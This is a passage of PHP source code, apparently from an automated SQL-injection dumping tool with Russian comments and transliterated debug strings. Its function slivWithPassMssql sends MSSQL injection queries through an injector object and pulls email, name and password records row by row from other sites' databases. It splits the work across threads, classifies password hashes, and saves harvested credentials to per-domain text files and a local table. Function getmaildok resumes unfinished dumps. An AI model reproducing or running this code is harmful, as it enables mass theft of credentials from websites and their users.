							$this->d($this->l2,'l2');
							
							
							if($this->l2 > $this->dlina and $this->up ==false)
							{
								$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								
								$this->Post->query("UPDATE  `multis` SET  `prich` = 'slivOneMulti po dline mnogo odinakovih $this->dlina'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								
								return 'vpizdu';
							}
								
							
						}else
						{
							$this->l2--;
						}
						
						$this->Post->query("INSERT INTO `mails_one` (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES('{$z[0]}','0',now(),'{$url[host]}','0','{$bd[1]}','{$zone}','{$m[1]}')");
						
						$hunta=0;	
					}
				}
				
			}else
			{
				$hunta = $hunta+1;
			}


			if($hunta==$this->hunta)
			{
				$this->d($hunta,' hunta > - '.$this->hunta);
				$this->logs($hunta.' hunta >:'.$this->hunta,__FUNCTION__);
				$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
				
				$this->Post->query("UPDATE  `multis` SET  `prich` = 'slivOneMulti hunta $this->hunta'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
				
				return 'vpizdu';
			}
		}
		$this->Post->query("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);					
		if($this->sliv_save==true){
			fclose($fh);
		}
		
	}
	
	////MSSQL///
	
	function slivWithPassMssql($id=2){ //слив паролей через ++MSSQL++
		
          if(!isset($this->raznica_dump) or $this->raznica_dump=='')$this->raznica_dump=60;
        
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		
		
		
		
		$mail = $this->Filed->findbyid($id);
		
		$this->d($mail,'$mail');
		//exit;

		$filed_id = $mail['Filed']['id'];
		
		$this->logs($filed_id.'-$filed_id:'.$this->r,__FUNCTION__);
		
		$this->d(' nachalo slivWithPassConcastMulti');
		
		$squle = $this->Post->query("SELECT * FROM  `posts` WHERE `id` = ".$mail['Filed']['post_id']." limit 0,1");

		
		if(!isset($squle[0]['posts']['id'])){
			
			$data = $this->Post->query("UPDATE  `fileds` SET  `get` =  '3', multi = 0 WHERE  `fileds`.`id` =".$mail['Filed']['id']); 
			return 'vpizdu';
			
		}
		
		$this->d($squle,'$squle POSTS');

		if(strlen($squle[0]['posts']['sleep']) > 2)
		{
			$set = $squle[0]['posts']['sleep'];
			$this->d($set,'pass SET dump slivWithPassConcastMulti');
		}else
		{
			$set = false;
		}
		
		
		
		
		
		///////общие данные из выборки/////////
		$bd = explode(':', $mail['Filed']['ipbase']);//все бд
		$count = $mail['Filed']['count'];
		$ff = intval($mail['Filed']['lastlimit']);//откуда начинать
		if($ff=='')$ff=0;
		
		
		
		//инициируем первоначальные параметры
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		
		if(preg_match("/microsoft/i",$squle[0]['posts']['version']))
		{
			$this->mysqlInj->mssql = true;
			
			$this->d('MSSQL!');
			
		}
		
		$this->mysqlInj ->inject($squle[0]['posts']['header'].'::'.$squle[0]['posts']['gurl'],$squle[0],$set);
		
		/////количество потоков смотрим из настроек////
		

		/////выбираем возможную инфу о уже существующих потоках ЗАПУЩЕННЫХ или УЖЕ ЗАВЕРЕШННЫХ////
		$multi = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$mail['Filed']['id']." AND `get` !=0");
		
		
		////сколько должно дампится за один раз////
		$tmpCount = $count-$mail['Filed']['lastlimit'];
		$oneCount = $tmpCount/$settings['potok'];
		$oneCount = round($oneCount);
		
		$shag = 1;//по сколько за раз будет дампится штук записей
		$zapr  = round($oneCount/$shag);//количество итераций
		if($zapr==0)$zapr=1;
		
		
		////логирование////
		$this->d($count,'$count');
		$this->d($mail['Filed']['lastlimit'],'$mail["Filed"]["lastlimit"]');
		$this->d($multi,"multi SELECT count(*) FROM  `multis` WHERE `filed_id` = ".$mail['Filed']['id']." AND `get` !=0");
		$this->d($zapr,'zapr pervuy KOLICHESTVO ITERACYU');
		$this->d($oneCount.' oneCount perviy S KAKOGO BUDEM NACHINAT $count-$mail["Filed"]["lastlimit"]/$settings["potok"]');
		
		
		flush();
		
		
		//////потоков нету, это первый////////
		if($multi[0][0]['count(*)'] == 0)
		{
			$this->d('//////////////////////////////////pervyi potok////////////////////////////////////////');
			///если меньше 5000 то больше к filed_id не обращается и дампим всё без деления на потоки////
			if($count < $this->potok_dump_one)
			{
				$oneCount = $count;
				$zapr  = round($oneCount/$shag);
				
				//$start =1;
				///логирование
				$this->d($zapr,'$zapr 5000');
				$this->logs($zapr.' $zapr 5000:'.$this->r,__FUNCTION__);
				
				
				$this->Post->query("UPDATE  `fileds` SET  `get` =  '2', `multi` = 2 WHERE  `id` =".$filed_id);
			}
			
			$potok = 1;
			
			//по сути если нуль ff, значит потоки еще не начинались, иначе первый lastlimit1 = ff будет
			if($ff == 0)
			{
				$start = 0;
			}else
			{
				$start = $ff;
			}
			
			
			//если нету уже в базе данных, тогда вставляем инфу о потоке
			$numPotok = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `potok` = ".$potok." AND `filed_id`=".$filed_id);
			
			$this->d($numPotok,'$numPotok vsego potokov');
			
			if($numPotok[0][0]['count(*)'] == 0)
			{
				
				//$this->d($squle,'squle $numPotok=0');
				
				$f = __FUNCTION__;
				$this->d('shag 1');
				
				$post_id = $squle[0]['posts']['id'];
				$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
				$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
				$h2 = parse_url($squle[0]['posts']['url']);
				$domen = $h2['host'];
				//$date = date('Y-m-d h:i:s');
				$date = time();
				$tmpCount1 = $oneCount+$start;
				
				$this->d($post_id,'$post_id');
				
				$this->d($domen,'domen');
				
				$this->d($tmpCount1,'$tmpCount1');
				
				$this->d($date,'$date');
				
				$this->d($f,'$f');
				
				$this->d($potok,'$potok');
				
				$this->d($start,'$start');
				
				$this->d($filed_id,'$filed_id');
				
				$this->d('shag 2');
				
				$this->d("INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$tmpCount1},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}',{$this->pid})");
				
				if($this->Post->query("INSERT INTO `multis` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$tmpCount1},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}','{$this->pid}')")){
					
					
				}
				
				$this->Post->query("UPDATE  `starts` SET  `potok` = {$potok} WHERE  `time_start` =".$this->timeStart);
				$this->d('shag 3');
			}
		}else
		{//если уже есть потоки тогда вычисляет значения следующего
			
			$this->d('ETO UJE NE PERVUY POTOK');
			
			//////////////////////ставим статус 2, где было уже 3 попытки////////////////////////////////////
			$zav0 = $this->Post->query("SELECT * FROM  `multis` WHERE `get` = 3 AND `dok` = 1 AND `filed_id` =".$filed_id." limit 1");
			
			
			$this->d($zav0,'$zav0 multislivcontacat pass  `get` = 3 AND `dok` = 1');
			
			
			if($zav0[0]['multis']['get'] == 3)
			{
				$this->d('////////////////////////////////////////POPPITKI ISCHERPANU get = 3 AND dok = 1 V PIZDU//////////////////////////////////////////');
				if($this->Post->query("UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ".$zav0[0]['multis']['potok']." AND `filed_id`=".$filed_id))
				{
					$this->d('YES update `multis` SET  `get` =  2');
				}
				$this->d("UPDATE  `multis` SET  `get` =  2 WHERE  `potok` = ".$zav0[0]['multis']['potok']." AND `filed_id`=".$filed_id);
				$this->d($zav0,'zav0 ETO ESLI BILI UJE 3 POPITKI `GET` 3 AND `DOK`=1 ////// Stavim status 2');
				return 'vpizdu';
			}
			
			
			
			//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
			
			/////проверка на перезапуск, не больше двух попыток////
			$zav = $this->Post->query("SELECT * FROM  `multis` WHERE `get`=3 AND `dok` < 1 AND `filed_id`=".$filed_id." limit 1");
			
			//$this->d($zav,' $zav `get`=3 AND `dok` < 1');
			
			if($zav[0]['multis']['get'] == 3)
			{
				$this->d('////////////////////PEREZAPUSK//////////////////////////////////////////');
				$this->d($zav,'zav get=3 AND dok < 1 ////// dlya perezapuska');
				$dok = $zav[0]['multis']['dok']+1;
				$this->Post->query("UPDATE  `multis` SET  `get` =  1,`dok` =".$dok." WHERE  `potok` = ".$zav[0]['multis']['potok']." AND `filed_id`=".$filed_id);
				$this->Post->query("UPDATE  `starts` SET  `potok` = ".$zav[0]['multis']['potok']." WHERE  `time_start` =".$this->timeStart);
				
				$start =$zav[0]['multis']['lastlimit'];
				$oneCount =$zav[0]['multis']['count']; 
				$potok = $zav[0]['multis']['potok'];
				
				$oneCount = $oneCount -$start;
				$zapr  = round($oneCount/$shag);
				$this->d($zapr,'$zapr get 3 KOLICHESTO ITERACYU POSLE PERESAPUSKA');
				
				
			}else
			{

				/////система расчёта добавления нового потока/////
				
				$this->d('////////////////////DOBAVLYAEM NOVYU POTOK//////////////////////////////////////////');
				$allPotok = $multi[0][0]['count(*)'];
				
				
				
				
				//выбираем инфу о последнем потоке, даже если он завершен
				$next = $this->Post->query("SELECT * FROM  `multis` WHERE `potok` = ".$allPotok." AND `filed_id`=".$filed_id);
				
				//логи
				$this->d($allPotok,'$allPotok slivWithPassConcastMulti');
				$this->d($next,'$next - infa o poslednem potoke slivWithPassMssql');
				
				
				$start = 	$next[0]['multis']['count'];
				$oneCount = $next[0]['multis']['count']+ $oneCount;
				$oneCount=$oneCount-20;
				
				$this->d($start,'$start');
				
				$this->d($count,'$count');
				
				$this->d($oneCount,'$oneCount');
				
				
				$potok =  	$next[0]['multis']['potok']+ 1;
				
				if($oneCount > $count)
				{
					/////логирование/////
					$this->d("$oneCount > $count oneCount > count  1");
					$oneCount = $count-100;
					$start = $start -100;
					
					if($potok >= 6 )
					{
						$potok = 6;
						$this->d('potok > 6 oneCount > count');
						
						
						$this->d("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id,'$oneCount > $count');
						if($this->Post->query("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id))
						{
							$this->d('YES update');
						}else{
							$this->d('NE obnovilos');
						}
						
						if($this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id)){
							
							$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$allPotok." AND `filed_id`=".$filed_id);
							$this->d('YES update potok > 6 oneCount > count slivpass contact prosto');
						}
						
						return 'vpizdu';
					}
				}
				
				
				
				
				
				////Если уже 6 штук есть потоков в таблице, то oneCount будет больше чем count, если не так то:
				if($oneCount < $count)
				{
					///если сумма потоков меньше или равно чем в настройках, то добавляем поток
					if($multi[0][0]['count(*)'] < $settings['potok'])
					{
						//если нету уже в базе данных, тогда вставляем инфу о потоке
						$numPotok = $this->Post->query("SELECT count(*) FROM  `multis` WHERE `potok` = ".$potok." AND `filed_id` =".$filed_id);
						
						$this->d("SELECT count(*) FROM  `multis` WHERE `potok` = ".$potok." AND `filed_id` =".$filed_id,'EST UJE POTOK TAKOY!!!');
						
						
						if($numPotok[0][0]['count(*)'] == 0)
						{
							$f = __FUNCTION__;
							
							$post_id = $squle[0]['posts']['id'];
							$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
							$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
							$h2 = parse_url($squle[0]['posts']['url']);
							$domen = $h2['host'];
							//$date = date('Y-m-d h:i:s');
							$date = time();
							if($this->Post->query("INSERT INTO multis (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES({$filed_id},{$start},{$oneCount},1,{$potok},'{$f}',{$post_id},'{$domen}','{$date}',{$this->pid})"))
							{
								$this->d($potok.' $potok YES insert zapis');
								$this->logs($potok.' - potok; YES insert zapis:'.$this->r,__FUNCTION__);
							}else
							{
								$this->d($potok.' $potok NO!!!! insert zapis');
								$this->logs($potok.' - potok;NO!!! insert zapis:'.$this->r,__FUNCTION__);
							}
							
							$this->Post->query("UPDATE  `starts` SET  `potok` = {$potok} WHERE  `time_start` =".$this->timeStart);
						}else{
							$this->d('POTOK UJE EST v multis status get=3 stavim slivWithPassConcastMulti');
							$this->logs('POTOK UJE EST v multis status get=3 stavim slivWithPassConcastMulti'.$this->r,__FUNCTION__);
							$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
							$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
							return 'vpizdu';
							
						}
					}else
					{
						$this->d('$multis[0][0][count(*)] <= $settings[potok]');
						$this->logs('$multis[0][0][count(*)] <= $settings[potok]:'.$this->r,__FUNCTION__);
						if($potok >6 )
						{
							$potok = 6;
							$this->d('potok > 6');
						}
						$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
						return 'vpizdu';
						
					}
				}
			}
			
			
		}
		
		
		
		//exit;
		////Подготовка
		$squle[0]['posts']['url'] = str_replace('http://','',$squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://'.$squle[0]['posts']['url'];
		
		$url = parse_url($squle[0]['posts']['url']);				
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone)-1];
		
		$MSSQL_email_name_pass = "./MSSQL_email_name_pass/".$url['host'].".txt";
		
		$MSSQL_email_name = "./MSSQL_email_name/".$url['host'].".txt";	
		
		$MSSQL_email_pass = "./MSSQL_email_pass/".$url['host'].".txt";	
		
		$MSSQL_email = "./MSSQL_email/".$url['host'].".txt";	

		
		
		
		
		
		$time=time();
		
		///Для расчёта дублей, пустых и хешей
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp=0;
		$this->email_gavno = 0;
		$this->emp_pass = 0;
		
		
		///логирование
		$this->logs($zapr.'-zapr poslednyu:'.$this->r,__FUNCTION__);
		$this->logs($oneCount.'-oneCount:'.$this->r,__FUNCTION__);
		$this->logs($count.'-count:'.$this->r,__FUNCTION__);
		$this->logs($start.'-start:'.$this->r,__FUNCTION__);
		$this->logs($potok.'-potok:'.$this->r,__FUNCTION__);
		
		$this->d($zapr.'-zapr poslednyu:'.$this->r);
		$this->d($oneCount.'-oneCount:'.$this->r);
		$this->d($count.'-count:'.$this->r);
		$this->d($start.'-start:'.$this->r);
		$this->d($potok.'-potok:'.$this->r);
		$this->d($this->pid.'-pid:'.$this->r);
		
		flush();
		
		//$i<ceil($lastlimit+$oneCount)
		//$zapr=40;
		
		for ($i=$start;$i<ceil($start+$oneCount);$i++)
		{
			echo $i.'-i<br>';
			
			$this->workup();
			
			$new = time();
			$razn = $new-$time;
			$this->d($razn,'razn');
			
            
             
            
			if($razn>$this->raznica_dump)
			{
				$this->d($razn.'-razn slivWithPassMssql po vremeni > 25:'.$this->r);
				$this->logs($razn.'-razn po vremeni:'.$this->r,__FUNCTION__);
				$this->Post->query("UPDATE  `multis` SET  `get` = 3  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
				$this->Post->query("UPDATE  `multis` SET  `prich` = 'razn slivWithPassMssql po vremeni'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
				
				//$this->stop();
				//$pid  = getmypid();
				//exec("kill -9 ".$pid);
				return 'vpizdu';
			}
			
			$time = time();
			
			$this->workup();
			$pass=explode(':', $mail['Filed']['password']);
			$pass = $pass[1];
			
			$name=explode(':', $mail['Filed']['name']);
			$name = $name[1];
			
			//$this->d($mail['Filed'],'name');
			
			$this->Post->query("UPDATE  `multis` SET  `lastlimit` = $i,`date`= $time,`pid`={$this->pid} WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
			
			
			
			
				
				
			$label = $mail['Filed']['label'];	
			$table_old = $mail['Filed']['table'];
			$table_new = $this->mysqlInj->charcher_mssql($mail['Filed']['table']);
			$bd_new = $bd[1];
			
			//$label = 'name';
			//$table_old = "aff_affiliate";
			//$pass = 'url';
			//$name = 'first_name';
				
				
			
			if($name !='' AND $pass !='')
			{
				$vvv = 'emailnamepass';
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT top 1 isnull([$label],char(32))+char(58)+isnull([$name],char(32))+char(58)+isnull([$pass],char(32)) from (select top $i [$label],[$name],[$pass] from [$bd_new]..[{$table_old}] order by [$label] asc) sq order by [$label] desc)");
				
				$mysql2 = $mysql["(/**/sElEcT top 1 isnull([$label],char(32))+char(58)+isnull([$name],char(32))+char(58)+isnull([$pass],char(32)) from (select top $i [$label],[$name],[$pass] from [$bd_new]..[{$table_old}] order by [$label] asc) sq order by [$label] desc)"];
				
				
			}elseif($name !='' AND $pass ==''){
				$vvv = 'emailname';
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT top 1 isnull([$label],char(32))+char(58)+isnull([$name],char(32)) from (select top $i [$label],[$name] from [$bd_new]..[{$table_old}] order by [$label] asc) sq order by [$label] desc)");
				
				$mysql2 = $mysql["(/**/sElEcT top 1 isnull([$label],char(32))+char(58)+isnull([$name],char(32)) from (select top $i [$label],[$name] from [$bd_new]..[{$table_old}] order by [$label] asc) sq order by [$label] desc)"];
				
			}else{
				$vvv = 'email';
				
				$mysql = $this->mysqlInj->mssqlGetValue("(/**/sElEcT top 1 isnull([$label] from (select top $i [$label] from [$bd_new]..[{$table_old}] order by [$label] asc) sq order by [$label] desc)");
				
				$mysql2 = $mysql["(/**/sElEcT top 1 isnull([$label] from (select top $i [$label] from [$bd_new]..[{$table_old}] order by [$label] asc) sq order by [$label] desc)"];
				
			}
				
			
			
			$this->d($mysql,'$mysql');
			
			
			$email_full = explode(':',$mysql2);
			
			$email_full = array_map(trim, $email_full);
			
			$this->d($email_full,'$email_full');
			
			if($vvv =='email'){
				
				$email_new = $mysql2;
				
			}elseif($vvv =='emailname'){
				
				if(strpos($email_full[0],'@')){
					
					$email_new = $email_full[0];
					$name_new = $email_full[1];
					
				}elseif(strpos($email_full[1],'@')){
					
					$email_new = $email_full[1];
					$name_new = $email_full[2];
					
				}
				
				
				
				
			}elseif($vvv =='emailnamepass'){
				
				
				if(strpos($email_full[0],'@')){
					
					$email_new = $email_full[0];
					$name_new = $email_full[1];
					$pass_new = $email_full[2];
					
				}elseif(strpos($email_full[1],'@')){
					
					$email_new = $email_full[1];
					$name_new = $email_full[2];
					$pass_new = $email_full[3];
					
				}
				
				
			}
		
			$this->d($email_new,'$email_new');
		
		
			
			
			
			if($email_new !='' AND strpos($email_new,'@'))
			{

				
				$null = 0;	
				$l =0;
				$tmp = array();
				$tmp3 = array();
				$p[0] = $email_new;
					
		
				if(strpos($pass_new,'mysql_fetch_array()') AND ($vvv =='emailnamepass'))
				{
					$this->Post->query("UPDATE  `multis` SET  `prich` = 'mysql_fetch_array'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					$this->d("mysql_fetch_array() UHODIM");
					return 'vpizdu';
				}
				
				if($pass_new == '' AND $name_new =='')
				{
					$this->emp_pass++;
				}
					
					
				if($this->emp_pass > 175 and $this->up == true)
				{
					$this->logs('$this->emp_pass > 175:'.$this->r,__FUNCTION__);
					$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					
					$this->Post->query("UPDATE  `multis` SET  `prich` = 'emp_pass > 175 pass pustie'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					
					return 'vpizdu';
				}
				
					
					
					
				@$key0 = array_search($pass_new, $this->stopword);

					
				if($key0 === FALSE AND strlen($pass_new) > 2 AND $email_new !='null' OR  ($name_new !='' AND strlen($name_new) > 2))
				{

					$ht = $this->hashtype($pass_new);
					
					if($ht != 1)
					{
						$this->hashtype = $ht;
					}else{
						$this->hashtype = '0';
					}

					preg_match('/\\A(?:^([a-z0-9][a-z0-9_\\-\\.\\+]*)@([a-z0-9][a-z0-9\\.\\-]{0,63}\\.([a-z]{2,4}))$)\\z/i',$p[0],$z);
					
					if($z[0] !='')//если строка мыло нормальное
					{
						
						$m = explode('@',$z[0]);
						
						@$key = array_search($pass_new, $tmp);
						//смотрит последний элемент массива не такой же он, чтобы найти короткие хеши 
						@$key2 = array_search(strlen($pass), array_slice($this->tmp2, count($this->tmp2)-1));
						
						//сравниваем мыла
						@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5)-1));
						
						
						//чтобы не было дубликатов
						@$key3 = array_search($p[0], $tmp3);
						
						//логи
						//$this->d(array_slice($this->tmp2, count($this->tmp2)-1),'slice');
						//$this->d(strlen($pass),'strlen');
						//$this->d($key2,'key');
						//flush();
						
						$tmp[]  = $pass_new;
						$tmp3[] = $p[0];
						
						$this->tmp2[] = strlen($pass_new);
						
						$this->tmp5[] = strlen($z[0]);
						
						
						if($this->hashtype == '0')
						{
							//$this->d($this->hashtype,'hash');
							
							
							//проверяем какой нить маленьких хэш по количеству символов
							if($key2 !== FALSE AND $this->k < 6)
							{
								$this->l2++;
								//$this->d($this->l2,'буква L2');
								if($this->l2 > 7)
								{
									$this->hashtype = 'unkown';
								}
								
							}else{
								$this->k++;
							}
						}
						
						//проверка чтобы мыла не были одной длины слишком часто
						if($key5 !== FALSE )
						{
							$this->l5++;
							//$this->d($this->l5,'l5');
							
							if($this->up ==true)
							{
								if($this->l5 > 5075 and $this->up == false)
								{
									$this->logs('$this->l5 > 5075:'.$this->r,__FUNCTION__);
									$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
									
									$this->Post->query("UPDATE  `multis` SET  `prich` = 'this->l5 > 5075 odonakovie po dline'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
									
									return 'vpizdu';
								}
							}else{
								if($this->l5 > 75 and $this->up == false)
								{
									$this->logs('$this->l5 > 75:'.$this->r,__FUNCTION__);
									$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
									
									$this->Post->query("UPDATE  `multis` SET  `prich` = 'this->l5 > 75 odonakovie po dline'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
									
									return 'vpizdu';
								}
								
							}
							
						}else{
							$this->l5--;
						}
						
						
						if($key === FALSE AND $key3 === FALSE)
						{
							
							if($this->Post->query("INSERT INTO mails (`email`,`name`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`,`meiler`) VALUES('{$p[0]}','{$name_new}','{$pass_new}',now(),'{$url[host]}','{$this->hashtype}','{$bd[1]}','{$zone}','{$m[1]}')")){
								
								if($email_new !='' AND $name_new !='' AND $pass_new !=''){
								
								
									$fh_email_name_pass = fopen($MSSQL_email_name_pass, "a+");
									fwrite($fh_email_name_pass, trim($email_new).':'.trim($name_new).':'.trim($pass_new)."\n");
									fclose($fh_email_name_pass);
								

								}elseif($email_new !='' AND $name_new !=''){
									
									$fh_email_name = fopen($MSSQL_email_name, "a+");
									fwrite($fh_email_name, trim($email_new).':'.trim($name_new)."\n");
									fclose($fh_email_name);
									
								}elseif($email_new !='' AND $pass_new !=''){
									
									$fh_email_pass = fopen($MSSQL_email_pass, "a+");
									fwrite($fh_email_name, trim($email_new).':'.trim($pass_new)."\n");
									fclose($fh_email_pass);
									
								}elseif($email_new !=''){
									
									
									$fh_email = fopen($MSSQL_email, "a+");
									fwrite($fh_email, trim($email_new)."\n");
									fclose($fh_email);
									
								}
								
							}
							
							
							
							
						}else
						{
							$l++;
							if($this->up ==true)
							{
								if($l == 15000  and $this->up == false)
								{
									$this->logs('$l == 15000:'.$this->r,__FUNCTION__);
									$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
									
									$this->Post->query("UPDATE  `multis` SET  `prich` = 'l == 15000 pohojie'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
									
									return 'vpizdu';
								}
							}else{
								if($l == 20  and $this->up == false)
								{
									$this->logs('$l == 20:'.$this->r,__FUNCTION__);
									$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
									
									$this->Post->query("UPDATE  `multis` SET  `prich` = 'l == 20 pohojie'  WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
									
									return 'vpizdu';
								}
								
							}
							
							//echo $key.'<br>';
						}
					}else
					{
						$this->email_gavno++;

						if($this->up ==true)
						{
							
							if($this->email_gavno == 15000  and $this->up == false)
							{
								echo 'Mnogo email_gavno 15000';
								$this->logs('Mnogo email_gavno:'.$this->r,__FUNCTION__);
								$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								$this->Post->query("UPDATE  `multis` SET  `prich` = 'Mnogo email_gavno 15000'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								
								return 'vpizdu';
							}
						}else{
							if($this->email_gavno == 250  and $this->up == false)
							{
								echo 'Mnogo email_gavno 250';
								$this->logs('Mnogo email_gavno:'.$this->r,__FUNCTION__);
								$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								$this->Post->query("UPDATE  `multis` SET  `prich` = 'Mnogo email_gavno 250'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
								
								return 'vpizdu';
							}

						}
					}	
				}
				else
				{
					$this->null++;
					$this->d($this->null,'count NULL TRIM');
					
					if($this->up ==true)
					{
						
						if($this->null == 15000  and $this->up == false)
						{
							$this->d( 'Много пустных или null '.$this->null);
							$this->logs('Mnogo null:'.$this->null.' '.$this->r,__FUNCTION__);
							$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
							$this->Post->query("UPDATE  `multis` SET  `prich` = 'Mnogo null 15000'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
							
							$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
							
							return 'vpizdu';
						}
					}else{
						if($this->null == 100  and $this->up == false)
						{
							$this->d( 'Много пустных или null '.$this->null);
							$this->logs('Mnogo null:'.$this->null.' '.$this->r,__FUNCTION__);
							$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
							$this->Post->query("UPDATE  `multis` SET  `prich` = 'Mnogo null 100'  WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
							
							$this->d("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND filed_id=".$filed_id);
							
							return 'vpizdu';
						}
						
					}
				}	
				flush();
				
			}else
			{
				$this->emp++;
				if($this->emp == 55  and $this->up == false){
					$this->d($this->emp ,'$this->emp = 55vpizdu');
					$this->logs($this->emp.' $this->emp = 55vpizdu:'.$this->r,__FUNCTION__);
					$this->Post->query("UPDATE  `multis` SET  `get` = 3 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
					$this->Post->query("UPDATE  `multis` SET  `prich`='this->emp = 55vpizdu vashe pusto'  WHERE  `potok`=".$potok." AND `filed_id`=".$filed_id);
					
					return "vpizdu";
					
				}
			}					
		
			//exit;
		
		}
		$this->Post->query("UPDATE  `multis` SET  `get` = 2 WHERE  `potok`=".$potok." AND `filed_id` =".$filed_id);
		
		
		//$this->renamename($filename);
		
		return ;
		
	}

	
	///////ДАМПИНГ ОБЫЧНЫЙ////////
	
	function getmaildok(){ // докачка баз

		
		$settings['potok_one']  = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass']= $this->pass;
		
		$this->timeStart = $this->start('getmaildok',1);
		
	
		
		if($settings['pass'] == 1)//если включено парсить ТОЛЬКО пассы
		{
			$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `get` = '3' AND dok < 4 ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
			if(count($data)==0)
			{
				$this->stop();
				die();
			}
			
		}elseif($settings['pass'] == 2)//только мыла просто
		{
			$data = $this->Post->query("SELECT * FROM  `fileds` WHERE (`password`='' or `password`=':') AND `get` = '3' AND dok < 3 ORDER BY  `fileds`.`count` DESC limit 1");//DESC
			if(count($data)==0)
			{
				$this->stop();
				die();
			}
			
		}else
		{
			
			$data = $this->Post->query("SELECT * FROM  `fileds` WHERE `password`!='' AND  `password`!=':' AND `get` = '3' AND dok < 4 ORDER BY  `fileds`.`count` DESC limit 1"); //DESC
			
			if(count($data)==0)
			{
				
